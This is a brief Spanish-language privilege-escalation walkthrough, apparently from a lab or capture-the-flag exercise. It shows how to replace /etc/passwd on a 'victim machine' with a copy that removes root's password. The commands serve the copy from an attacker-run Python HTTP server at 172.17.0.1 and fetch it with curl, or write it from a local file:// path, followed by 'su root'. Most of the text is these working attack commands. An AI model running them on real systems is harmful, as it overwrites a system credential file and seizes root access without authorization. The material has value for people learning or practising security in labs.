Podemos subir a la maquina victima un archivo como root, lo más facil es cambiar los privilegios en el /etc/passwd (quitando la "x" evitamos la consulta al /etc/shadows que almacena la contraseña, se la quitamos a root)

En la maquina atacante: 

```bash
sudo python3 -m http.server 80
```

En la maquina victima:

```bash
curl 172.17.0.1/passwd -o /etc/passwd
```

y

```bash
: su root
```

O:

crear el archivo malicioso en tmp:

```bash
/usr/bin/curl [file:///tmp/passwd](file:///tmp/passwd) -o /etc/passwd
```

```bash
su root
```
